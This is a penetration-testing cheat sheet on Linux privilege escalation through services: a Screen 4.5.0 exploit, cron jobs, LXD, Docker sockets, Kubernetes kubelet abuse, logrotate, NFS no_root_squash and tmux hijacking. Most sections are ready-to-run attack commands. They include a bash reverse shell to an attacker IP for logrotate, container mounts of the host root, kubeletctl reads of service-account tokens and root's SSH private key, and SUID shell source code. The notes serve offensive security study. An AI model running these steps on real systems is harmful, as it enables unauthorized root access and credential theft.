# Service-Based Priv Esc

- Vulnerable Services
- Cron Job Abuse
- LXD
- Docker
- kubernetes
- Logrotate
- Miscellaneous Techniques

## Vulnerable Services

Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer Screen. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

**Screen Version Identification**
````
$ screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
````
This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

**Privilege Escalation - Screen_Exploit.sh**
````
$ ./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
````

## Cron Job Abuse

Cron jobs can also be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc.When created, the cron file will be created in /var/spool/cron for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours. The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused.

We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.

Let's run pspy and have a look. The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan procfs every 1000ms (or every second).

````
$ ./pspy64 -pf -i 1000

2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
````
From the above output, we can see that a cron job runs the backup.sh script located in the /dmz-backups directory and creating a tarball file of the contents of the /var/www/html directory.

Add command or reverse shell to this backup.sh

## LXD

**Containers**

Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

**Linux Containers**

Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

**Linux Daemon**

Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the lxc or lxd group.

Exploitation
````
$ lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias imagetemp
$ lxc image list
$ lxc init imagetemp privesc -c security.privileged=true
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
$ lxc start privesc
$ lxc exec privesc /bin/sh
# ls -l /mnt/root
````

## Docker

Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.

Docker Architecture

At the core of the Docker architecture lies a client-server model, where we have two primary components:
- The Docker daemon
- The Docker client

### Docker Privilege Escalation**

**Docker Shared Directories**

When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container. This is incredibly useful for persisting data, sharing code, and facilitating collaboration between development environments and Docker containers.

**Docker Sockets**

A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon. When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.

````
$ ls -al
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

$ docker -H unix:///app/docker.sock ps
````
We can create our own Docker container that maps the host’s root directory (/) to the /hostsystem directory on the container. With this, we will get full access to the host system. 
````
$ docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem <image_created>
$ docker -H unix:///app/docker.sock ps
$ docker -H unix:///app/docker.sock exec -it <ID_New_Image> /bin/bash
````

**Docker Group**

````
$ id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
````
Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run docker as root. All three options allow us to work with Docker to escalate our privileges.
````
$ docker image ls
$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <Repository> chroot /mnt bash
````

## Kubernetes

Kubernetes, also known as K8s, stands out as a revolutionary technology that has had a significant impact on the software development landscape. This platform has completely transformed the process of deploying and managing applications, providing a more efficient and streamlined approach. Offering an open-source architecture, Kubernetes has been specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.

### Privilege Escalation

**Kubelet API - Extracting Tokens**
````
$ kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
````
**Kubelet API - Extracting Certificates**
````
$ kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
````
**List Privileges**
````
$ export token=`cat k8.token`
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
````
Pod YAML
````
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
````
**Creating a new Pod**
````
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 get pods
````
**Extracting Root's SSH Key**
````
$ kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
````

## Logrotate

Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called logrotate takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, logrotate has been developed. The logs in /var/log give administrators the information they need to determine the cause behind malfunctions. Almost more important are the unnoticed system details, such as whether all services are running correctly.

Logrotate has many features for managing these log files. These include the specification of:
- the size of the log file,
- its age,
- and the action to be taken when one of these factors is reached.

To exploit logrotate, we need some requirements that we have to fulfill.
1. we need write permissions on the log files
2. logrotate must run as a privileged user or root
3. vulnerable versions:
 - 3.8.6
 - 3.11.0
 - 3.15.0
 - 3.18.0

````
$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
create
````
Exploitation
````
$ gcc logrotten.c -o logrotten
$ echo 'bash -i >& /dev/tcp/<Our_IP>/<Our_Port> 0>&1' > payload
$ ./logrotten -p ./payload /tmp/tmp.log
````

## Miscellaneous Techniques

### Passive Traffic Capture

If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as net-creds and PCredz that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

### Weak NFS Privileges

````
$ showmount -e <IP>
````
When an NFS volume is created, various options can be set:

| Option         | Description                                                                                                                                                                                                                                  |
|----------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| root_squash    | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
| no_root_squash | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                           |

````
$ cat /etc/exports
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
````
For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.
````
$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

$ gcc shell.c -o shell
````
````
<Our Attacker Machine>
$ sudo mount -t nfs <IP>:/tmp /mnt
$ cp shell /mnt
$ chmod u+s /mnt/shell
````
````
<Victim Machine>
$ ./shell
# id
uid=0(root) gid=0(root) groups=0(root)
````

### Hijacking Tmux Sessions

Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a tmux window, we can detach from the session, still leaving it active (i.e., running an nmap scan). For many reasons, a user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

````
$ tmux -S /shareds new -s debugsess
$ chown root:devs /shareds
````
If we can compromise a user in the devs group, we can attach to this session and gain root access.
````
$ tmux -S /shareds
````
